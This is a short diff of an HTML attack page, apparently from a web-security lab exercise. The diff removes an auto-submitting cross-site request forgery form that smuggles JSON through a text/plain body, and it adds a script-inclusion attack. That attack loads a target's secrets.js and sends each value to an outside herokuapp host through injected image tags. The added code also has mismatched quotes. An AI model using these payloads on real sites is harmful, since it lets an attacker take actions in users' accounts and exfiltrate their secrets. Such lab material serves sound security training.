@@ -3,9 +3,16 @@
 <head>
     <title>Test</title>
 </head>
-<body onload="document.getElementById('csrf').submit()">
-    <form id="csrf" action="http://ptl-f7150db2-ab136e4e.libcurl.so/share" method="POST" enctype="text/plain" >
-        <input type="hidden" name='{"user":"test","id":0,"fake":"' value='"}' >
-    </form>
+<body>
+    <script>
+    function display(data) {
+        for (var key in data){
+            var li = document.createElement("li");
+            document.write("<img src="https://lab--work.herokuapp.com/?s="+data[key]+"'/ >");
+        }
+    }
+    </script>
+    <script src="http://ptl-02ff0e01-d2a6422a.libcurl.so/secrets.js">
+    </script>
 </body>
 </html>
